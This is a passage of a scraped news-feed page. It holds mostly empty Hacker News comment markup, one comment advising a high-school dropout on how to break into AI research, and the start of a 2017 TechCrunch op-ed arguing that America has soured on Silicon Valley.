&lt;table border=&quot;0&quot; readability=&quot;7.885342019544&quot;&gt;&lt;tr readability=&quot;15.770684039088&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;240&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;15.770684039088&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15438581&quot; readability=&quot;9.814371257485&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;4.9071856287425&quot;&gt;&lt;tr readability=&quot;9.814371257485&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;240&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;15.702994011976&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15435932&quot; readability=&quot;6.6169811320755&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;3.3084905660377&quot;&gt;&lt;tr readability=&quot;6.6169811320755&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;160&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15435754&quot; readability=&quot;6.8571428571429&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;3.4285714285714&quot;&gt;&lt;tr readability=&quot;6.8571428571429&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;160&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15436395&quot; readability=&quot;16.536218250235&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;8.2681091251176&quot;&gt;&lt;tr readability=&quot;16.536218250235&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;160&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;10.213546566322&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15436127&quot; readability=&quot;10.767463235294&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;5.3837316176471&quot;&gt;&lt;tr readability=&quot;10.767463235294&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;160&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;8.3203125&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15436715&quot; readability=&quot;9.9989293361884&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;4.9994646680942&quot;&gt;&lt;tr readability=&quot;9.9989293361884&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;200&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;7.271948608137&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15438033&quot; readability=&quot;8.6768617021277&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;4.3384308510638&quot;&gt;&lt;tr readability=&quot;8.6768617021277&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;240&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;9.6409574468085&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15438538&quot; readability=&quot;5.5655172413793&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;2.7827586206897&quot;&gt;&lt;tr readability=&quot;5.5655172413793&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;280&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15438693&quot; readability=&quot;10.792452830189&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;5.3962264150943&quot;&gt;&lt;tr readability=&quot;10.792452830189&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;240&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;12.264150943396&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15435868&quot; readability=&quot;5.9178743961353&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;2.9589371980676&quot;&gt;&lt;tr readability=&quot;5.9178743961353&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;160&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15435525&quot; readability=&quot;6.1814516129032&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;3.0907258064516&quot;&gt;&lt;tr readability=&quot;6.1814516129032&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;5.2983870967742&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15435609&quot; readability=&quot;2.5221674876847&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15435952&quot; readability=&quot;13.560975609756&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;6.780487804878&quot;&gt;&lt;tr readability=&quot;13.560975609756&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;80&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;8.1365853658537&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15439469&quot; readability=&quot;10.969957081545&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;5.4849785407725&quot;&gt;&lt;tr readability=&quot;10.969957081545&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;120&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;8.6845493562232&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15439502&quot; readability=&quot;8.4272727272727&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;4.2136363636364&quot;&gt;&lt;tr readability=&quot;8.4272727272727&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;120&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;5.6181818181818&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15436014&quot; readability=&quot;2.8163265306122&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15436233&quot; readability=&quot;6.6201550387597&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;3.3100775193798&quot;&gt;&lt;tr readability=&quot;6.6201550387597&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;160&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15436701&quot; readability=&quot;3.5368421052632&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;1.7684210526316&quot;&gt;&lt;tr readability=&quot;3.5368421052632&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;160&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15436038&quot; readability=&quot;2.1333333333333&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15435705&quot; readability=&quot;4.7114093959732&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15435757&quot; readability=&quot;3.5714285714286&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15435821&quot; readability=&quot;4.275&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;2.1375&quot;&gt;&lt;tr readability=&quot;4.275&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;80&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15435791&quot; readability=&quot;2.1476510067114&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15435480&quot; readability=&quot;1.3589743589744&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15435715&quot; readability=&quot;8.0828025477707&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;4.0414012738854&quot;&gt;&lt;tr readability=&quot;8.0828025477707&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;40&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15438225&quot; readability=&quot;24.738708473311&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;12.369354236655&quot;&gt;&lt;tr readability=&quot;24.738708473311&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;30.181224337439&quot;&gt;

&lt;br/&gt;&lt;div class=&quot;comment&quot; readability=&quot;34.934061793519&quot;&gt;&lt;span class=&quot;c00&quot;&gt;High school dropout with AI research cited in Nature.&lt;/span&gt;
&lt;p&gt;&lt;span class=&quot;c00&quot;&gt;You are going to have a hard road in front of you if you want to seriously make a dent in AI research. ML research is a bit more accessible to outsiders than AI research, because a lot of fundamental AI research can be a bit &quot;out there&quot;, and is praised/discarded depending on the tenure/authority of the authors. But you probably already knew this. Just be careful to avoid (meta-)theoretical research that is close to futurism or philosophy without any credentials: It is easier to label outsiders as kooks.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;c00&quot;&gt;First, create a blog. Write articles in a way that they are accessible to your skill/knowledge level one year ago. Get in the habit of writing and performing write-ups of your experiments. Share good articles on social media (Twitter, DataTau, /r/machinelearning).&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;c00&quot;&gt;(Co-)author a workshop paper for an AI or ML conference. Workshops have lower bars for acceptance. If anything, you'll receive valuable feedback.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;c00&quot;&gt;Find an (assistant) professor who is an expert in a topic/subject you are interested in (don't go for Hinton in the first try). Familiarize yourself with their work and send them a polite short email asking for (search term) pointers on your research, their research, or related works.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;c00&quot;&gt;Replicate as many research papers as you can. Implement the papers that don't have accompanying source code. Get in the habit of running many experiments. Post these on Github. Publish on social media, mentioning original authors. Mint a DOI.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;c00&quot;&gt;Benchmarks (competitions) don't care about your credentials. Win one / do very well, and you'll create a platform for your research and methods, based purely on practical results and in compared to many other techniques. Papers based on winning results are fairly easy to write and do well impact-wise.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;c00&quot;&gt;Really, don't worry about getting scooped, or making an error that embarrasses your supervisor for years. Leave that for the PhD's. Just get something out there, a Wordpress blog is enough. If your research is useless, no harm done (it won't get any cites if you managed to publish it in a journal). If your research has value, you'll have plenty of researchers read it and get inspired: This is your contribution to science (and, unfortunately, don't expect much cites to a blog post).&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;c00&quot;&gt;Optionally, solve the college dropout problem instead. If you want to dedicate yourself to being a researcher on AI, give your &quot;startup&quot; some rocket fuel and get a higher education in the field of data science/physics/computer science/AI. The synergy of young smart people and older wiser academics is something that is very hard to replicate on your own. &lt;/span&gt;&lt;/p&gt;

&lt;/div&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15438264&quot; readability=&quot;6.5&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;3.25&quot;&gt;&lt;tr readability=&quot;6.5&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;40&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;3.7142857142857&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15438598&quot; readability=&quot;12.629840546697&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;6.3149202733485&quot;&gt;&lt;tr readability=&quot;12.629840546697&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;80&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;10.201025056948&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15438519&quot; readability=&quot;1.0545454545455&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15435652&quot; readability=&quot;4.7648261758691&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;2.3824130879346&quot;&gt;&lt;tr readability=&quot;4.7648261758691&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;4.7648261758691&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15435625&quot; readability=&quot;1.4545454545455&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15436397&quot; readability=&quot;0.11111111111111&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15436124&quot; readability=&quot;4.5791245791246&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;2.2895622895623&quot;&gt;&lt;tr readability=&quot;4.5791245791246&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;3.6632996632997&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15435660&quot; readability=&quot;2.3951612903226&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15437451&quot; readability=&quot;2.3939393939394&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15438738&quot; readability=&quot;5.3394495412844&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;2.6697247706422&quot;&gt;&lt;tr readability=&quot;5.3394495412844&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;40&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15435614&quot; readability=&quot;1.3978494623656&quot;&gt;&lt;td&gt;
&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;athing comtr&quot; id=&quot;15436882&quot; readability=&quot;7.4576271186441&quot;&gt;&lt;td&gt;
&lt;table border=&quot;0&quot; readability=&quot;3.728813559322&quot;&gt;&lt;tr readability=&quot;7.4576271186441&quot;&gt;&lt;td class=&quot;ind&quot;&gt;&lt;img src=&quot;https://news.ycombinator.com/s.gif&quot; height=&quot;1&quot; width=&quot;0&quot;/&gt;&lt;/td&gt;
&lt;td valign=&quot;top&quot; class=&quot;votelinks&quot;&gt;
&lt;center&gt;

&lt;/center&gt;
&lt;/td&gt;
&lt;td class=&quot;default&quot; readability=&quot;7.4576271186441&quot;&gt;

&lt;br/&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;
&lt;/tr&gt;&lt;/table&gt;</description>
<pubDate>Mon, 09 Oct 2017 16:44:53 +0000</pubDate>
<dc:creator>james1234</dc:creator>
<dc:format>text/html</dc:format>
<dc:identifier>https://news.ycombinator.com/item?id=15435371</dc:identifier>
</item>
<item>
<title>Dear Silicon Valley: America’s fallen out of love with you</title>
<link>https://techcrunch.com/2017/10/08/dear-silicon-valley-americas-fallen-out-of-love-with-you/</link>
<guid isPermaLink="true" >https://techcrunch.com/2017/10/08/dear-silicon-valley-americas-fallen-out-of-love-with-you/</guid>
<description>&lt;img src=&quot;https://tctechcrunch2011.files.wordpress.com/2017/10/screen-shot-2017-10-08-at-12-29-53-pm.png?w=738&quot; class=&quot;&quot;/&gt;&lt;div class=&quot;byline contributor-byline&quot; readability=&quot;3.448275862069&quot;&gt;

&lt;p class=&quot;bio&quot;&gt;Ross Baird is the founder and executive director of &lt;a href=&quot;http://www.vilcap.com/&quot;&gt;Village Capital&lt;/a&gt;.&lt;/p&gt;
&lt;div class=&quot;more-posts&quot; readability=&quot;7.5428571428571&quot;&gt;More posts by this contributor:
&lt;/div&gt;
&lt;/div&gt;&lt;p class=&quot;m_8682927492432925989gmail-m_-8653187843881757139gmail-m_-1724516925904706591m_-3482983802917832813gmail-Normal1&quot;&gt;&lt;span lang=&quot;EN&quot;&gt;Dear Silicon Valley, &lt;/span&gt;&lt;span lang=&quot;EN&quot;&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;m_8682927492432925989gmail-m_-8653187843881757139gmail-m_-1724516925904706591m_-3482983802917832813gmail-Normal1&quot;&gt;&lt;span lang=&quot;EN&quot;&gt;You used to be the envy of the world. Over the last decade I’ve seen countless cities try to become you, from &lt;a target=&quot;_blank&quot; href=&quot;https://en.wikipedia.org/wiki/List_of_technology_centers#Places_with_.22Silicon.22_names&quot; rel=&quot;noopener&quot;&gt;the Silicon Savannah to the Silicon Bayou&lt;/a&gt;.&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;m_8682927492432925989gmail-m_-8653187843881757139gmail-m_-1724516925904706591m_-3482983802917832813gmail-Normal1&quot;&gt;&lt;span lang=&quot;EN&quot;&gt;At last year’s Global Entrepreneurship Summit on Stanford’s campus, hundreds of entrepreneurs from Mongolia to South Sudan came to listen to President Obama and Mark Zuckerberg and get a touch of your magic fairy dust. The American Dream — anyone with an idea, a garage and a good work ethic can build a great company — might as well have been born in your backyard. I admire your innovation, openness, creativity and all you stand for.&lt;/span&gt;&lt;/p&gt;
&lt;p id=&quot;speakable-summary&quot;&gt;&lt;span class=&quot;m_8682927492432925989gmail-m_-8653187843881757139gmail-im&quot;&gt;In case you haven’t noticed, though, you’ve changed from hero to villain. You’re too expensive and exclusive for the rest of the world: The garages that gave us Hewlett-Packard and Google now cost millions of dollars. You’ve moved from icon to joke — the show that bears your name is a cringe-worthy, true-to-life satire.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;m_8682927492432925989gmail-m_-8653187843881757139gmail-im&quot;&gt;You’re churning out companies that are raising hundreds of millions of dollars, and going bankrupt in literal satires of themselves: a $700 million blood-testing company that never had any actual results; a $120 million juicer with packets that can actually be squeezed by hand.&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;m_8682927492432925989gmail-m_-8653187843881757139gmail-m_-1724516925904706591m_-3482983802917832813gmail-Normal1&quot;&gt;&lt;span lang=&quot;EN&quot;&gt;Now &lt;a target=&quot;_blank&quot; href=&quot;https://www.fastcompany.com/40472189/why-the-publics-love-affair-with-silicon-valley-might-be-over&quot; rel=&quot;noopener&quot;&gt;Fast Company is declaring the end of the public’s “love affair”&lt;/a&gt; with the Silicon Valley ideal, and everyone from socialist Bernie Sanders to hard-right Steve Bannon is calling for your biggest companies to be heavily regulated, and your reputation is fast approaching that of Wall Street (which used to have a good reputation, too).&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;m_8682927492432925989gmail-m_-8653187843881757139gmail-m_-1724516925904706591m_-3482983802917832813gmail-Normal1&quot;&gt;&lt;span lang=&quot;EN&quot;&gt;Here are a few places that you went wrong — and what you can do to fix it.&lt;/span&gt;&lt;/p&gt;
&lt;div id=&quot;attachment_1496120&quot; class=&quot;wp-caption alignnone&quot; readability=&quot;32&quot;&gt;&lt;img class=&quot;wp-image-1496120 size-full&quot; src=&quot;https://tctechcrunch2011.files.wordpress.com/2017/05/o-silicon-valley-facebook.jpg?w=2000&amp;amp;h=1000&quot; alt=&quot;&quot; width=&quot;2000&quot; height=&quot;1000&quot; srcset=&quot;https://tctechcrunch2011.files.wordpress.com/2017/05/o-silicon-valley-facebook.jpg 2000w, https://tctechcrunch2011.files.wordpress.com/2017/05/o-silicon-valley-facebook.jpg?w=150&amp;amp;h=75 150w, https://tctechcrunch2011.files.wordpress.com/2017/05/o-silicon-valley-facebook.jpg?w=300&amp;amp;h=150 300w, https://tctechcrunch2011.files.wordpress.com/2017/05/o-silicon-valley-facebook.jpg?w=768&amp;amp;h=384 768w, https://tctechcrunch2011.files.wordpress.com/2017/05/o-silicon-valley-facebook.jpg?w=680&amp;amp;h=340 680w&quot; sizes=&quot;(max-width: 2000px) 